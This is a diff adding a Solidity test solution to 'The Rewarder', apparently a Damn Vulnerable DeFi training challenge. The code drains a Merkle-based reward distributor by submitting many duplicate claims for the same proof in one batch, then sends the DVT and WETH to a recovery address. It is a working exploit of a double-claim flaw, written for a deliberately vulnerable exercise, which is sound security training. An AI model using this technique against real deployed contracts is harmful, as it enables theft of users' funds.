@@ -148,7 +148,45 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        merkle = new Merkle();
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        uint dvtClaimSize = 11524763827831882;
+        uint wethClaimSize = 1171088749244340;
+
+        uint dvtClaimCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtClaimSize;
+        uint wethClaimCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethClaimSize;
+
+        Claim[] memory claims = new Claim[](dvtClaimCount + wethClaimCount);
+        for (uint i = 0; i < dvtClaimCount; i++) {
+            // A bunch of DVT claims
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: dvtClaimSize,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, 188)
+            });
+        }
+
+        for (uint j = 0; j < wethClaimCount; j++) {
+            // A bunch of WETH claims
+            claims[j + dvtClaimCount] = Claim({
+                batchNumber: 0,
+                amount: wethClaimSize,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, 188)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(address(player)));
+        weth.transfer(recovery, weth.balanceOf(address(player)));
     }
 
     /**
